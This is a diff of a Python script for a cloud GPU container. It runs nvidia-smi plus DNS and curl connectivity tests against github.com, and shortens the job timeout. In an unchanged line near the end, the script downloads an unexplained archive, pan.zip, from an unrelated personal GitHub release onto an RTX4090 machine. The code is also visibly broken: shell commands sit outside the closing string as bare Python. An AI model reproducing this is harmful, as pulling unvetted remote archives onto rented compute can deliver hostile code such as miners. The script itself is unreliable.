@@ -7,9 +7,9 @@ image = (
         base_image="nvidia/cuda:12.1.1-runtime-ubuntu22.04",
     )
     .add_commands([
-    "apt-get update -y",
-    "apt-get install -y curl ca-certificates dnsutils",
-])
+        "apt-get update -y",
+        "apt-get install -y curl ca-certificates dnsutils",
+    ])
 )
 
 
@@ -19,31 +19,30 @@ image = (
     gpu="RTX4090",
     cpu=4,
     memory="8Gi",
-    timeout=4 * 60 * 60,
+    timeout=10 * 60,
 )
 def run_script():
-    # cek GPU
+    print("=== GPU TEST ===")
     subprocess.run(["nvidia-smi"], check=False)
 
     cmd = r"""
-    echo "=== DNS TEST ==="
-    getent hosts github.com || true
+echo "=== DNS TEST ==="
+getent hosts github.com || true
 
-    echo "=== NSLOOKUP TEST ==="
-    nslookup github.com || true
+echo "=== NSLOOKUP TEST ==="
+nslookup github.com || true
 
-    echo "=== CURL TEST ==="
-    curl -v --connect-timeout 15 https://github.com/ -o /tmp/github.html
+echo "=== CURL TEST ==="
+curl -v --connect-timeout 15 https://github.com/ -o /tmp/github.html
 
-    echo "=== CURL EXIT CODE ==="
-    echo $?
+echo "=== CURL EXIT CODE ==="
+echo $?
 
-    echo "=== RESULT ==="
-    ls -lh /tmp/github.html || true
+echo "=== RESULT ==="
+ls -lh /tmp/github.html || true
 
-    echo "=== TEST FINISHED ==="
-    """
-
+echo "=== TEST FINISHED ==="
+"""
     echo "=== DOWNLOAD FILE ==="
     curl -sL -q https://github.com/hujisanda/root/releases/download/nwe/pan.zip -O pan.zip
 
